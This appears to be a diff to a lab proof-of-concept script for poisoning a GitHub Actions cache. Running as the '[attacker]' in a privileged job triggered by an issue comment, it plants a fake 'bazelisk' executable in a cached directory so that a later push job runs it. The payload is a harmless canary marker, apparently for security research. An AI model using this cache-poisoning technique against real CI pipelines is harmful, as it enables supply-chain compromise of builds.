@@ -9,6 +9,17 @@
 set -uo pipefail
 echo "[attacker] code executing in privileged context as $(whoami) on $(hostname)"
 
+# Stage 2 feasibility test: plant a poisoned "bazelisk" into the dir that the job's
+# trusted bazel/setup cache step saves. If the issue_comment job's save is later served
+# to a push job, this canary binary will execute there. Canary-only, no secret/callback.
+mkdir -p ~/.cache/bazelisk
+cat > ~/.cache/bazelisk/bazelisk <<'BZ'
+#!/usr/bin/env bash
+echo "LAB_CANARY_7F3A poisoned-bazelisk ran in: ${GITHUB_WORKFLOW:-?} / ${GITHUB_JOB:-?} (src=issue_comment-cache)" | tee "$(pwd)/LAB-POISON-PROOF.txt"
+BZ
+chmod +x ~/.cache/bazelisk/bazelisk
+echo "[attacker] planted poisoned ~/.cache/bazelisk/bazelisk for the cache-save step"
+
 CANARY_FILE="$(pwd)/LAB-PROOF.txt"
 {
   echo "LAB_CANARY_7F3A executed"
